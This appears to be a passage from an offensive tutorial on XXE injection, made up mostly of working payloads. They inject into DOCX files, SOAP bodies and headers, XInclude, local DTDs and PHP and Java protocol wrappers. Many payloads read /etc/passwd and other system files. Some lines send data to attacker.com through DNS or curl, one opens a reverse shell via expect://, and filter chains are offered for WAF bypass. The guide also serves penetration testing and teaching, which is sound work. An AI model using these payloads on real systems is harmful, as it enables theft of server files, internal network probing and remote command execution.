DOCX files follow a similar structure (ZIP-based XML). The critical file is `word/document.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

Same extraction/repackaging process as XLSX.

### General strategy

The approach is the same for all XML-based formats (SVG, XLSX, DOCX, ODS, ODP, XML, XHTML): include a basic entity, upload, check output. If output is not reflected use blind XXE. Some servers validate MIME types so you may need to craft polyglot files.

## XXE in SOAP

SOAP is built on XML and remains widely used in enterprise systems (financial, government). Since SOAP inherently consumes XML, it is a natural target for XXE.

A typical SOAP request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
  </soap:Header>
  <soap:Body>
    <GetUser>
      <userId>123</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

### Injection in the SOAP Body

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <userId>&xxe;</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

### Injection in the SOAP Header

The header is also parsed and can be used as injection point:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <Authentication>
      <token>&xxe;</token>
    </Authentication>
  </soap:Header>
  <soap:Body>
    <GetUser>
      <userId>123</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

### SOAP Fault-Based Exfiltration

SOAP returns SOAP Fault messages on errors which are useful for blind XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/&#x25;file;'>">
  %eval;
  %error;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <userId>test</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

### WS-Addressing

Some SOAP services use WS-Addressing headers which provide another injection point:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <soap:Header>
    <wsa:ReplyTo>
      <wsa:Address>&xxe;</wsa:Address>
    </wsa:ReplyTo>
  </soap:Header>
  <soap:Body>
    <GetUser>
      <userId>123</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

## XXE via XInclude

XInclude is an XML specification that allows including external XML documents without requiring a DOCTYPE declaration. This can bypass protections that specifically disable DOCTYPE processing.

XInclude uses `<xi:include>` to reference external files:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

The `parse="text"` attribute treats included content as plain text:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <section>
    <title>System Information</title>
    <content>
      <xi:include href="file:///etc/hostname" parse="text"/>
    </content>
  </section>
</document>
```

The `parse="xml"` attribute (default) includes content as XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <data>
    <xi:include href="file:///etc/xml/catalog" parse="xml"/>
  </data>
</document>
```

For OOB exfiltration:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <data>
    <xi:include href="http://attacker.com/include.xml"/>
  </data>
</document>
```

XInclude also supports fallback elements when the primary include fails:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <content>
    <xi:include href="file:///etc/passwd" parse="text">
      <xi:fallback>
        <e>File not accessible</e>
      </xi:fallback>
    </xi:include>
  </content>
</document>
```

## Content-Type Switching

Some APIs accept multiple content types and internally convert between formats. Many parsers dont validate the actual content against the declared content-type so we can try submitting XML payloads with different headers.

### JSON to XML

An API that accepts JSON may internally convert it to XML. We can try sending raw XML with a JSON content-type:

```http
POST /api/data HTTP/1.1
Host: example.com
Content-Type: application/json

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### XML to JSON

Some APIs accept XML but convert to JSON:

```http
POST /api/data HTTP/1.1
Host: example.com
Content-Type: application/xml

{
  "data": "<?xml version='1.0'?><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>]]>"
}
```

### Testing strategy

APIs with poor input validation might accept `text/xml`, `application/xml`, `application/json`, `text/plain` or even missing content-types with XML content. Try the XXE payload with various content-type headers, with null/missing headers, and with charset parameters (`application/xml; charset=utf-8`).

## Handling Files with XML-Special Characters

When targeting files that contain special XML characters (`<`, `>`, `&`) direct entity inclusion fails because those characters break XML parsing. This is a common limitation when trying to read config files, HTML files or source code.

CDATA sections allow inclusion of raw content without interpretation but entity expansion does not occur within CDATA sections so wrapping the entity in CDATA will not work:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<foo><![CDATA[&xxe;]]></foo>
```

The workaround is to use error-based exfiltration or OOB techniques since errors bypass normal XML parsing rules:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///path/to/file/with/special/chars.xml">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/&#x25;file;'>">
  %eval;
  %error;
]>
<foo></foo>
```

The error message will contain the file contents including the special characters. When exfiltrating via HTTP GET requests the special characters get automatically URL-encoded in the query string which also helps.

---

# Advanced Techniques

These techniques require specific technology stacks, rare configurations or complex payload crafting. They are not the first thing to try but can be critical when standard techniques fail. This section also includes environment-specific escalation paths (like RCE trough PHP expect:// or Java deserialization) which depend on very particular conditions in the target.

## Local System DTD Exploitation (Blind XXE)

When OOB connections are blocked and the application only returns errors, we can use pre-existing DTD files on the system to build our exfiltration chain without needing network access.

### Why Enumerate the Filesystem?

The goal of enumerating the filesystem is to locate **default DTD files** present on the system. These files can be leveraged to perform advanced XXE attacks because they often:

- Define **parameter entities** that can be overridden.
- Allow us to inject our own entities to manipulate output and include file contents indirectly.

### Common DTD Paths

```
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/sgml/docbook/ent/iso8879/ISOtech.ent
/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
/usr/share/xml/docbook/custom/dtds/4.5/docbookx.dtd
/usr/share/xml/xhtml/xhtml11-flat.dtd
/usr/share/xml/html/xhtml11-flat.dtd
/usr/share/iso8879/iso8879.ent
/usr/share/xml/svg11/svg11-flat.dtd
/opt/java/openjdk/conf/dtds/
/usr/share/java/*/dtds/
/etc/xml/catalog
/usr/local/etc/xml/catalog
```

To check if a DTD exists we load it and check the parser response:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  %local_dtd;
]>
<message></message>
```

Error-based feedback indicates successful DTD loading. If we get a different error or no error at all we know the file exists.

### Exploitation Using fonts.dtd

- **Step 1:** Load the Local DTD:

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  %local_dtd;
]>
<message></message>
```

- **Step 2:** Override Parameter Entities:
`fonts.dtd` defines entities like `%expr` that can be overridden. We redefine them to include our malicious logic:

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>%local_dtd;
]>
<message></message>
```

**Explanation:**

1. `%file` loads the contents of `/etc/passwd` from the local filesystem.
2. `%eval` creates a new parameter entity `%error` that references a non-existent file path concatenated with `%file` content.
3. When the parser expands `%error`, it attempts to resolve the invalid path, triggering an error message that includes the contents of `/etc/passwd`.

- **Step 3:** Trigger Error-Based Exfiltration:
If the application returns error messages, the response will include something like:

```
errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"
```

### Requirements for Robust Payloads

Creating a working payload for local DTD-based XXE exploitation requires careful attention to XML and DTD parsing rules. Below are the key requirements:

1. **Valid DTD Structure**

- The injected payload must maintain a syntactically valid DTD.
- All markup declarations (`<!ELEMENT>`, `<!ENTITY>`) must appear in a proper order.
- If the included DTD (`%local_dtd;`) contains markup declarations, use a **dummy element** (e.g., `<!ELEMENT aa (bb'>`) to absorb conflicts and prevent parser errors.

2. **Correct Entity Nesting and Escaping**

- Nested entity declarations inside another entity must be properly escaped:
  * Use `&#x25;` for `%`, `&#x26;` for `&` and `&#x27;` for  quotes.
  * **Example**:

    ```xml
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///path/%file;'>">
    ```

- Failure to escape these characters often results in **markup declaration errors**.

3. **Order of Expansion**

- Define and expand entities in the correct sequence:
- Override entities first.
- Expand `%eval;` and `%error;` before including `%local_dtd;`.
- Incorrect ordering can cause the parser to reject the payload.

4. **Include a Structural Padding**

- When including external DTDs, add a placeholder declaration like:

```xml
  <!ELEMENT aa (bb'>
```

- This prevents syntax conflicts when the external DTD introduces new declarations.

5. **Use Parameter Entities for Injection**

- Always use **parameter entities** (`%`) for overriding and chaining.

6. **Error-Based Exfiltration Logic**

- Reference a non-existent file concatenated with the target file content.
- Example:

```xml
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
```

7. **Compatibility with Target DTD**

- The chosen local DTD must allow parameter entity overrides.
- Common candidates: `fonts.dtd`, `docbook.dtd`, `jspxml.dtd`

## DNS-Based OOB Exfiltration

When HTTP/HTTPS connections are blocked by firewall rules, DNS exfiltration provides an alternative. DNS traffic is rarely fully blocked so even if the HTTP request never reaches us, the DNS query still happens when the parser tries to resolve the domain:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%exfiltrate;
```

Monitor DNS queries on `attacker.com` to capture data. Tools like `dnsdumpster` or custom DNS servers can log the queries. Services like **Interactsh** also provide automatic DNS logging:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.interactsh-domain.com/'>">
%eval;
%exfiltrate;
```

## PHP Wrappers

PHP's XML functions support protocol wrappers that extend XXE capabilities beyond simple file inclusion. These only work on PHP-based targets.

### expect:// Wrapper (Environment-Specific RCE)

The `expect://` wrapper executes system commands trough PHP. This is one of the few paths from XXE to RCE but it requires the PHP `expect` extension to be installed and enabled which is disabled by default in modern PHP. In practice this is rare but when present the impact is critical:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

More examples:

```xml
<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">
<!ENTITY xxe SYSTEM "expect://bash -i >& /dev/tcp/attacker.com/4444 0>&1">
<!ENTITY xxe SYSTEM "expect://curl http://attacker.com/?data=$(cat /etc/passwd | base64)">
```

`expect://` requires the PHP `expect` extension which as mentioned is rarely present in production environments.

### php://filter Wrapper (Base64 Encoding)

The `php://filter` wrapper reads files with encoding filters. Useful for files that contain characters that would break XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Output:
```
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo...
```

Filters can be chained for WAF bypass:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode|convert.base64-encode/resource=file:///etc/passwd">
```

Other available filters:

```xml
<!ENTITY xxe SYSTEM "php://filter/string.strip_tags/resource=file:///var/www/html/index.php">
<!ENTITY xxe SYSTEM "php://filter/string.toupper/resource=file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.quoted-printable-encode/resource=file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/string.rot13/resource=file:///etc/passwd">
```

### data:// and zip:// Wrappers

`data://` allows embedding data directly, useful for bypassing URL-based filters:

```xml
<!ENTITY xxe SYSTEM "data://text/plain,malicious content">
```

`zip://` reads files from ZIP archives without extraction. Useful for attacking uploaded XLSX/DOCX:

```xml
<!ENTITY xxe SYSTEM "zip:///path/to/archive.zip#filename.xml">
```

## Java Protocol Exploitation

Java's XML parsers support additional protocols. These only apply when the target runs Java.

### jar:// Protocol (Environment-Specific Escalation)

Accesses files within Java archives. In very specific scenarios where the application loads external JARs and deserialization gadgets are available in the classpath, this could potentially be chained into RCE. This is a rare condition but worth testing in Java environments:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:file:///path/to/application.jar!/path/to/resource">
]>
<foo>&xxe;</foo>
```

### netdoc:// Protocol

Some Java implementations support `netdoc://`:

```xml
<!ENTITY xxe SYSTEM "netdoc:file:///etc/passwd">
```

### LDAP and RMI

Can trigger LDAP queries for SSRF against internal LDAP servers:

```xml
<!ENTITY xxe SYSTEM "ldap://ldap.example.com/cn=users,dc=example,dc=com?objectClass?sub">
```

Java RMI registries:

```xml
<!ENTITY xxe SYSTEM "rmi://internal-server:1099/object_name">
```

---

# Troubleshooting Guide

| Symptom | Likely Cause | Solution |
|---------|--------------|----------|
| "Malformed XML" error | XML syntax error in payload | Validate payload syntax; use XML validators |
| "Unknown protocol: X" | Typo in protocol name | Use valid protocols: `file://`, `http://`, `ftp://` |
| No entity expansion in output | Entity expansion disabled | Try XInclude or wrapper techniques |
| No callback received from OOB | Firewall blocking outbound | Use DNS-based OOB; test from DMZ if possible |
| File contents show only first line | Binary/special characters | Use CDATA or error-based exfiltration |
| DOCTYPE not allowed error | DOCTYPE explicitly disabled | Use XInclude or file upload techniques |
| Entity limit exceeded | Billion Laughs protection active | Use single entity; avoid recursive expansion |
| 403/500 on OOB callback | WAF blocking the request | Obfuscate URL; use different protocols |
| Parameter entities not expanding | Parser doesnt support them | Use general entities; try XInclude |
| "Connection refused" on SSRF | Target port not open | Verify port; check firewall |
| Base64 decoding shows garbage | Filter chain incorrect | Test php://filter chains individually |
| No error message feedback | Application suppresses errors | Use blind XXE with OOB exfiltration |

---

# Tools and Resources

## Security Testing Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| **XXEinjector** | Automated XXE payload generation | `./xxeinjector.py -u http://target.com -f file` |
| **oxml_xxe** | XXE in Office documents (DOCX, XLSX) | `python oxml_xxe.py generate -t xlsx` |
| **Burp Suite Collaborator** | OOB XXE detection and exfiltration | Built-in to Burp Suite Pro |
| **Interactsh** | Free OOB interaction logging (DNS, HTTP) | `./interactsh-client` |
| **PayloadsAllTheThings** | XXE payload repository | https://github.com/swisskyrepo/PayloadsAllTheThings |
| **CyberChef** | Payload encoding/transformation | https://cyberchef.io/ |

### XXEinjector

```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector
./xxeinjector.py -u http://target.com/api/process -f file.xml
./xxeinjector.py -u http://target.com -t bing -p http://127.0.0.1:8080/admin
```

### oxml_xxe

```bash
pip install oxml_xxe
python -m oxml_xxe generate -t xlsx -p "file:///etc/passwd" -o malicious.xlsx
python -m oxml_xxe generate -t docx -p "http://attacker.com/?data=test" -o malicious.docx
```

### Interactsh

```bash
wget https://github.com/projectdiscovery/interactsh/releases/download/v1.0.0/interactsh-client_1.0.0_linux_amd64.zip
unzip interactsh-client_1.0.0_linux_amd64.zip
./interactsh-client
# Use the generated domain in XXE payloads: http://<YOUR_INTERACTSH_DOMAIN>/?data=%file;
```

---

# References

## OWASP

- [A05:2021 – XML External Entity (XXE)](https://owasp.org/Top10/A05_2021-XML_External_Entity_XXE/)
- https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Processing

## PortSwigger Web Security Academy

- https://portswigger.net/web-security/xxe
- https://portswigger.net/web-security/xxe/blind
- https://portswigger.net/web-security/xxe/file-upload

## Community

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- https://tryhackme.com/room/xxe

## Papers

- **XML External Entity (XXE) Processing** - NIST Guidelines
- **DTD Security Considerations** - W3C XML Specifications
